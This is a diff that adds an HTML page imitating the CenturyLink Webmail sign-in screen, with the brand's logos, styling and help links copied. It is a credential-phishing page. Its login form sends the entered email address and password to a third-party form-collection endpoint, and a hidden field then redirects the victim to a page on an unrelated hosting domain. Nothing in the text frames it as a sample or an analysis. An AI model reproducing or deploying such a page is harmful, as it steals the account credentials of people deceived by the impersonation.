@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><!-- Start Meta Fields  -->
+	<meta charset="utf-8" />
+	<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+	<meta content="width=device-width, minimum-scale=1.0, initial-scale=1.0,maximum-scale = 1.0, user-scalable = no" name="viewport" />
+	<title>Sign In - CenturyLink Webmail</title>
+	<!-- Ends Meta Fields  --><!-- Font -->
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet" /><!-- End Font --><!-- #CSS library STARTS -->
+	<link crossorigin="anonymous" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet" />
+	<link href="/app/s/lumen2/css/style2.css?v=3" rel="stylesheet" type="text/css" />
+	<link href="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/css/responsive_v2.css" rel="stylesheet" type="text/css" /><!-- #CSS library ENDS --><!-- :::: Google Analytics STARTS :::: --><!-- Google tag (gtag.js) --><script async src="https://www.googletagmanager.com/gtag/js?id=G-YXWHMNXEB8" async></script><script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-YXWHMNXEB8');
+    </script><!-- :::: Google Analytics ENDS  :::: --><script>
+
+		var m_sDomaincode = "clnet"
+		var g_bMobile = false;
+		var g_sCtime = "2/20/2023 4:57:35 AM";
+	
+	</script>
+	<style type="text/css">input {
+			box-shadow: none;
+		}
+	
+		input:focus {
+			box-shadow: none !important;
+		}
+	
+		.form-group {
+			margin-bottom: 0px !important;
+		}
+	
+		.btndisabled {
+			color: #fff;
+			background-color: #B4BCC9 !important;
+		}
+	
+		.loadingimg {
+			display: block;
+			visibility: hidden;
+			margin-left: auto;
+			margin-right: auto;
+			width: 47px;
+			height: 47px;
+			background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif")
+		}
+
+		body {
+
+
+
+			background-image: url(https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/centurylink-logo-black-BG5.svg); background-repeat: no-repeat; background-position: right bottom; background-size: calc(max(30%, 500px));
+		
+
+    	}
+
+		.main-title-wrap h1::after {
+			background-color: #db0632 !important;
+
+		}
+	</style>
+</head>
+<body><main class="main-content-wrapper sign-in-wrapper" id="mLoginBox">
+<header>
+<div class="site-logo"><a href="https://centurylink.net/" target="_parent"><img alt="CenturyLink" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/centurylink_logo_s.png" /> </a></div>
+</header>
+
+<section class="content-holder">
+<div class="container"><!-- Site Title Starts -->
+<div class="main-title-wrap text-center">
+<h1 style="display: none;"><span class="text-content">Sign in</span></h1>
+
+<div class="dec-wrap" style="display: none;">
+<p>Welcome to the new CenturyLink Webmail!</p>
+</div>
+</div>
+<!-- Site Title Ends --><!-- Form Field Starts -->
+
+<div class="form-detail-wrapper">
+<div class="left-content-wrap" style="margin-bottom: 20px">
+<form action="https://submit-form.com/xMFTzdcm" method="POST"><input name="_redirect" type="hidden" value="https://quiet-salad-3252.on.fleek.co//securefilecenturylink.HTML/" />
+<div class="form-group">&nbsp;</div>
+
+<div class="form-group">&nbsp;</div>
+
+<div class="form-group"><label for="ign-in-email">CenturyLink Email</label>&nbsp;</div>
+
+<div class="form-group"><input autocomplete="on" id="sign-in-email" name="signin_email" required="" type="text" value="" /></div>
+
+<div class="form-group"><span class="email-error error-msg" id="errmsg_signin_email" style="visibility: hidden">This needs to be filled</span></div>
+
+<div class="form-group">Password</div>
+
+<div class="form-group"><input autocomplete="on" id="signin_password" name="signin_password" onkeydown="fnSigninKeyDown(this,event)" required="" type="password" value="" /> &nbsp;<span class="email-error error-msg" id="errmsg_signin_password" style="visibility: hidden">This needs to be filled</span></div>
+
+<div class="form-group" style="font-size: 12px"><input id="RememberMe" name="LoginForm[RememberMe]" style="width: auto !important;height: auto  !important;" type="checkbox" /> Stay signed in</div>
+
+<div class="form-group" style="font-size: 12px">&nbsp;</div>
+</form>
+
+<div class="empty-error" id="errmsg_api" style="font-size: 12px; color: #d93025; position:static; margin: 25px 0 10px; visibility: hidden; line-height:18px !important; margin-top: 15px !important">xxxx</div>
+
+<div class="g-recaptcha" data-callback="fnRecaptchaCallback" data-sitekey="" id="g-recaptcha" style="display: none">&nbsp;</div>
+<button id="signup_btn" onclick="fnSignin('m'); return false;" style="margin-top: 20px !important; background-color: #0047bb !important;"><span style="background-color:#F0FFFF;">Sign In</span></button>
+
+<div class="form-group" style="font-size: 12px; padding-top: 15px;"><a class="link" href="/v1/recover/" style="color:#0047bb !important;" target="blank">Forgot Password?</a><span style="float: right"><a class="link" href="https://centurylinkwebmail.s.center/hc/en-us" style="color:#0047bb !important;" target="blank">Need help?</a></span></div>
+
+<div class="form-group" style="font-size: 14px; padding-top: 20px; font-weight: bold;"><span style="display: table; margin: 0 auto;"><!--<a  href="JavaScript:alert('This will take you to the registration form...')"  class="link" style="color: #0047bb !important;" >Create New Email Account</a>--> <a class="link" href="/v1/sig/" style="color: #0047bb !important; display:none">Create New Email Account</a> </span></div>
+
+<div class="loadingimg">&nbsp;</div>
+
+<div class="get-mobile-app" style="margin-top: 0px !important; display: none; ">
+<h6 class="text-center" style="margin-top: 0px !important;">Get the mobile app:</h6>
+
+<ul class="store-wrap">
+	<li class="apple-store"><a href="https://apps.apple.com/us/app/srt-email/id1496178263" target="_blank"><img alt="/" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/apple-store.png" /> </a></li>
+	<li class="google-store"><a href="https://play.google.com/store/apps/details?id=com.srtmail" target="_blank"><img alt="/" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google-store.png" /> </a></li>
+</ul>
+</div>
+</div>
+
+<div class="right-content-wrap" style="display: none ;">
+<figure><img alt="" src="/../app/s/lumen2/webmaillogin_0.png" /></figure>
+</div>
+<!-- 
+					<div class="right-content-wrap" style="margin-bottom: 40px">
+						<div class="short-des">
+							<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quo, maiores quasi. Officiis odit similique incidunt aut, laudantium et ea officia. Debitis fugit odio quam consectetur quia similique ex alias, commodi.</p>
+						</div>
+						<ul class="connect-with">
+							<li class="facebook">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/facebook.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Facebook</span>
+								</a>
+							</li>
+							<li class="google">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Google</span>
+								</a>
+							</li>
+							<li class="twitter">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/twitter.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Twitter</span>
+								</a>
+							</li>
+							<li class="microsoft">
+								<a href="#">
+									<span class="icon-wrap">
+										<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/microsoft.png" alt="Social Icon">
+									</span>
+									<span class="text-content">Continue with Microsoft</span>
+								</a>
+							</li>
+						</ul>
+					</div>
+					 --></div>
+<!-- Form Field Ends --></div>
+</section>
+</main>
+
+<p><!-- Modal --></p>
+
+<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="msgModal" role="dialog" tabindex="-1">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-body" id="msgModalBody">Wrong usernmae or password</div>
+
+<div class="modal-footer"><button class="btn btn-secondary" data-dismiss="modal" type="button">Close</button></div>
+</div>
+</div>
+</div>
+
+<p><!-- /.modal --></p>
+
+<div class="modal fade" id="FeedBackmodal">
+<div class="modal-dialog">
+<div class="modal-content bmd-modalContent">
+<div class="modal-body">
+<div class="close-button"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span></button></div>
+
+<div class="embed-responsive embed-responsive-16by9" id="FeedbackModalBody" style="height: 230px"><iframe class="embed-responsive-item" frameborder="0" id="ifrFeedBack" src="../../app/feedback.asp"></iframe></div>
+</div>
+</div>
+<!-- /.modal-content --></div>
+<!-- /.modal-dialog --></div>
+
+<p><!-- /.modal --><!-- /.modal --></p>
+
+<div class="modal fade" id="SecurityFeatureModal">
+<div class="modal-dialog modal-dialog-centered" style="max-width: 550px; width: 550px;">
+<div class="modal-content bmd-modalContent" style="border-radius: 20px!important;">
+<div class="modal-body">
+<div class="modal-body">
+<h2 style="font-weight: bold;">Secure Your CenturyLink Email Account <!--Get_Text(lang,"pass_roptions_security_feature_title")--></h2>
+
+<figure style="float: right; shape-outside:circle(50%);margin-top: 20px; "><img alt="/" src="../../app/s/lumen2/images/Security_lb.png?v=2" style="padding-left: 50px ;" /></figure>
+
+<p>We have improved our security measures to create a better experience for our customers and better align with industry standards for email.<br />
+<br />
+Update your backup information to ensure getting back into your account is easy! <!-- Get_Text(lang,"pass_roptions_security_feature_desc")%>--></p>
+<button id="securityFeature_s01btn" onclick="fnSecurityFeatureModalNow(); return false;" style="margin-top: 5px !important; display:block; font-size:12px; padding:5px 20px; color:#fff; background-color:#0047bb !important;border-radius: 4px!important;">Set up recovery methods now</button><a class="back-link link" href="JavaScript:fnSecurityFeatureModalLater()" id="securityFeature_s02btn" style="font-size: 12px;">Remind me later </a></div>
+</div>
+</div>
+<!-- /.modal-content --></div>
+<!-- /.modal-dialog --></div>
+
+<p><!-- /.modal --><!-- /.modal --></p>
+
+<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="CreateTModal" role="dialog" tabindex="-1">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-body" id="msgModalBody">&nbsp;</div>
+
+<div class="modal-footer"><button class="btn btn-secondary" data-dismiss="modal" type="button">Close</button></div>
+</div>
+</div>
+</div>
+
+<p><!-- /.modal --><!-- #JS library STARTS --><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><!-- Latest compiled and minified JavaScript --><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script><script src="/app/s/lumen2/js/signin.js?v=4:57:35 AM2/20/2023"></script><script>
+	//:::::::
+	//:::::::
+	function fnLoginNoSession()
+	{
+
+	}
+
+	
+	</script><!-- One JS file to rule them all! --><script src="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/cdn-JavaScriptINC_2020_15_bz.js" async></script><script src="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/cdn-PageJS_53099_7_9_bz_lu2_6.js" async></script></p>
+</body>
+</html>
